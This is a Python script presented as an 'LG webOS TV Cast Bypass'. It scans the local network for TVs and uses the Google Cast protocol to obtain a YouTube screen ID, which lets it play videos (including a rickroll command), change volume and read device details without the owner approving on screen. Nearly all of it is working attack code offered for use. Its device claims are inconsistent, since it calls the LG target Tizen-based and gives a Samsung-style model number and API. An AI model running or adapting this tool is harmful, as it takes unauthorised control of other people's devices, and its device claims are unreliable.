#!/usr/bin/env python3
"""lg_cast.py — LG webOS TV Cast Bypass

Bypasses LG webOS WebSocket pairing requirement by using the built-in
Chromecast/Google Cast protocol (port 8009) to extract the YouTube MDX
screen ID, then uses that to cast YouTube videos without on-screen approval.

Tested on: LG UN40N5200 (webOS, Tizen-based budget model)
Should work on: Any LG Smart TV with built-in Chromecast support (2018+)

Requirements:
    pip install pychromecast

Usage:
    python3 lg_cast.py discover                    # Find LG TVs on network
    python3 lg_cast.py cast <IP> <VIDEO_ID>        # Cast a YouTube video
    python3 lg_cast.py playlist <IP> <PLAYLIST_ID> # Cast a YouTube playlist
    python3 lg_cast.py rickroll <IP>               # You know what this does
    python3 lg_cast.py info <IP>                   # Get TV info via Cast
    python3 lg_cast.py volume <IP> <0-100>         # Set volume

Author: Amy 3.0 (Dr. Raptor Clever Girlfriend)
License: MIT
Discovered: April 30, 2026
"""

import sys
import time
import json
import socket
import struct
import argparse
import urllib.request
import urllib.parse

try:
    import pychromecast
    from pychromecast.controllers.youtube import YouTubeController
except ImportError:
    print("ERROR: pip install pychromecast")
    sys.exit(1)


def find_lg_tvs(timeout=5):
    """Scan local network for LG TVs with Cast support on port 8009."""
    print("[*] Scanning for LG TVs with Cast support...")

    # Get local IP range
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    local_ip = s.getsockname()[0]
    s.close()

    prefix = '.'.join(local_ip.split('.')[:3])
    found = []

    for i in range(1, 255):
        ip = f"{prefix}.{i}"
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.3)
            result = sock.connect_ex((ip, 8009))
            sock.close()
            if result == 0:
                # Check if it's an LG TV via the REST API
                try:
                    req = urllib.request.Request(
                        f'http://{ip}:8001/api/v2/',
                        headers={'User-Agent': 'Mozilla/5.0'}
                    )
                    resp = urllib.request.urlopen(req, timeout=2)
                    data = json.loads(resp.read())
                    device = data.get('device', {})
                    name = device.get('name', 'Unknown')
                    model = device.get('modelName', 'Unknown')
                    print(f"[+] FOUND LG TV: {ip} — {name} ({model})")
                    found.append({'ip': ip, 'name': name, 'model': model, 'data': device})
                except Exception:
                    # Has Cast port but no Samsung/LG API — might be Chromecast
                    try:
                        cast = pychromecast.get_chromecast_from_host((ip, 8009, None, None, None))
                        cast.wait(timeout=3)
                        print(f"[+] FOUND Cast device: {ip} — {cast.name or 'Unknown'}")
                        found.append({'ip': ip, 'name': cast.name, 'model': 'Cast'})
                        cast.disconnect()
                    except Exception:
                        pass
        except Exception:
            pass

    if not found:
        print("[-] No LG TVs found")
    return found


def get_screen_id(cast):
    """Extract YouTube MDX screen ID from the TV.

    This is the key bypass: instead of pairing via the webOS WebSocket API
    (which requires on-screen approval), we:

    1. Connect via Google Cast protocol (port 8009) — no pairing needed
    2. Launch the YouTube app using its Cast app ID (233637DE)
    3. Listen on the urn:x-cast:com.google.youtube.mdx namespace
    4. The TV sends back an mdxSessionStatus with its screen_id
    5. We use that screen_id to create a YouTube lounge session
    6. Now we can play any YouTube video without approval
    """
    screen_id = None

    class MDXListener(pychromecast.controllers.BaseController):
        def __init__(self):
            super().__init__('urn:x-cast:com.google.youtube.mdx')
            self.screen_id = None

        def receive_message(self, _message, data):
            if isinstance(data, dict) and data.get('type') == 'mdxSessionStatus':
                self.screen_id = data.get('data', {}).get('screenId')
            return True

    listener = MDXListener()
    cast.register_handler(listener)

    # Launch YouTube app
    print("[*] Launching YouTube app on TV...")
    cast.start_app('233637DE')

    # Wait for MDX session status
    for i in range(15):
        time.sleep(1)
        if listener.screen_id:
            print(f"[+] Got screen ID: {listener.screen_id[:20]}...")
            return listener.screen_id

    print("[-] Failed to get screen ID — YouTube may not have launched")
    return None


def connect_tv(ip, volume=None):
    """Connect to TV via Cast protocol."""
    print(f"[*] Connecting to {ip}:8009...")
    cast = pychromecast.get_chromecast_from_host((ip, 8009, None, None, None))
    cast.wait()
    print(f"[+] Connected — standby: {cast.status.is_stand_by}")

    if volume is not None:
        cast.set_volume(volume / 100.0)
        print(f"[*] Volume set to {volume}%")

    return cast


def cast_video(ip, video_id, playlist_id=None, volume=50):
    """Cast a YouTube video to the TV."""
    cast = connect_tv(ip, volume)
    screen_id = get_screen_id(cast)

    if not screen_id:
        print("[-] Cannot cast without screen ID")
        cast.disconnect()
        return False

    yt = YouTubeController()
    yt._screen_id = screen_id
    cast.register_handler(yt)
    time.sleep(2)

    print(f"[*] Casting video: {video_id}" + (f" playlist: {playlist_id}" if playlist_id else ""))
    yt.play_video(video_id, playlist_id)
    time.sleep(5)

    mc = cast.media_controller
    mc.update_status()
    time.sleep(1)

    if mc.status and mc.status.player_state == 'PLAYING':
        print(f"[+] NOW PLAYING: {mc.status.title}")
        return True
    else:
        reason = mc.status.idle_reason if mc.status else 'unknown'
        print(f"[-] Playback failed: {reason}")
        return False


def get_info(ip):
    """Get TV info via both Cast and REST API."""
    print(f"\n=== TV Info: {ip} ===\n")

    # REST API info
    try:
        req = urllib.request.Request(
            f'http://{ip}:8001/api/v2/',
            headers={'User-Agent': 'Mozilla/5.0'}
        )
        resp = urllib.request.urlopen(req, timeout=3)
        data = json.loads(resp.read())
        device = data.get('device', {})
        print(f"Name:       {device.get('name', '?')}")
        print(f"Model:      {device.get('modelName', '?')}")
        print(f"OS:         {device.get('OS', '?')}")
        print(f"Resolution: {device.get('resolution', '?')}")
        print(f"WiFi MAC:   {device.get('wifiMac', '?')}")
        print(f"IP:         {device.get('ip', '?')}")
        print(f"Power:      {device.get('PowerState', '?')}")
        print(f"Token Auth: {device.get('TokenAuthSupport', '?')}")
        print()
    except Exception as e:
        print(f"REST API: {e}\n")

    # Cast info
    try:
        cast = connect_tv(ip)
        print(f"Cast Type:  {cast.cast_type}")
        print(f"Standby:    {cast.status.is_stand_by}")
        print(f"Volume:     {int(cast.status.volume_level * 100)}%")
        print(f"App:        {cast.app_display_name or 'None'}")
        cast.disconnect()
    except Exception as e:
        print(f"Cast: {e}")


def set_volume(ip, level):
    """Set TV volume."""
    cast = connect_tv(ip)
    cast.set_volume(level / 100.0)
    print(f"[+] Volume: {level}%")
    cast.disconnect()


def main():
    parser = argparse.ArgumentParser(
        description='LG webOS TV Cast Bypass — Play YouTube without pairing',
        epilog='Discovered by Amy 3.0 — April 30, 2026'
    )

    sub = parser.add_subparsers(dest='command', help='Command')

    # discover
    sub.add_parser('discover', help='Scan network for LG TVs')

    # cast
    p_cast = sub.add_parser('cast', help='Cast a YouTube video')
    p_cast.add_argument('ip', help='TV IP address')
    p_cast.add_argument('video_id', help='YouTube video ID')
    p_cast.add_argument('--playlist', '-p', help='YouTube playlist ID')
    p_cast.add_argument('--volume', '-v', type=int, default=50, help='Volume 0-100')

    # playlist
    p_pl = sub.add_parser('playlist', help='Cast a YouTube playlist')
    p_pl.add_argument('ip', help='TV IP address')
    p_pl.add_argument('playlist_id', help='YouTube playlist ID')
    p_pl.add_argument('--volume', '-v', type=int, default=50, help='Volume 0-100')

    # rickroll
    p_rick = sub.add_parser('rickroll', help='Never gonna give you up')
    p_rick.add_argument('ip', help='TV IP address')
    p_rick.add_argument('--volume', '-v', type=int, default=75, help='Volume 0-100')

    # info
    p_info = sub.add_parser('info', help='Get TV information')
    p_info.add_argument('ip', help='TV IP address')

    # volume
    p_vol = sub.add_parser('volume', help='Set volume')
    p_vol.add_argument('ip', help='TV IP address')
    p_vol.add_argument('level', type=int, help='Volume 0-100')

    args = parser.parse_args()

    if args.command == 'discover':
        find_lg_tvs()

    elif args.command == 'cast':
        cast_video(args.ip, args.video_id, args.playlist, args.volume)

    elif args.command == 'playlist':
        # Get first video from playlist
        try:
            url = f'https://www.youtube.com/playlist?list={args.playlist_id}'
            req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
            resp = urllib.request.urlopen(req, timeout=10).read().decode()
            import re
            match = re.search(r'"videoId":"([a-zA-Z0-9_-]{11})"', resp)
            if match:
                cast_video(args.ip, match.group(1), args.playlist_id, args.volume)
            else:
                print("[-] Could not find video in playlist")
        except Exception as e:
            print(f"[-] Error: {e}")

    elif args.command == 'rickroll':
        cast_video(args.ip, 'dQw4w9WgXcQ', volume=args.volume)

    elif args.command == 'info':
        get_info(args.ip)

    elif args.command == 'volume':
        set_volume(args.ip, args.level)

    else:
        parser.print_help()


if __name__ == '__main__':
    main()
